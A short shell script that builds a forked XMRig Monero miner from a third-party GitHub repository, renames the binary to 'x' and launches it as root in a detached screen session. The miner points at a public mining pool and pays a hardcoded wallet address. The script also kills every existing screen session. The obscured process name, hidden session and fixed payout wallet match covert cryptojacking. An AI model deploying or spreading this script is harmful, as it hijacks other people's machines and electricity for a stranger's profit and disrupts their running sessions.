echo Installing XMRig
sudo apt-get update
sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev screen -y
git clone https://github.com/vihangatheturtle/axmrig.git
mkdir axmrig/build && cd axmrig/build
cmake ..
make -j$(nproc)
mv xmrig x
killall screen
screen -dmS s
screen -S s -X stuff "cd ~/axmrig/build && sudo ./x -o pool.supportxmr.com:443 -u 47W7FksJjZWXqPnaXzBCd9bubEjNjCdGDiNA9g7Y88u6M19uxFB7aM76R3oHWuPSvzad5B7STRZYbKgJce5eZGEV5i9KSC9 -k --tls -p $HOSTNAME --randomx-1gb-pages\n"
clear
echo Build complete, run \"screen -r s\" to view the console, you may need to enter a system password there!
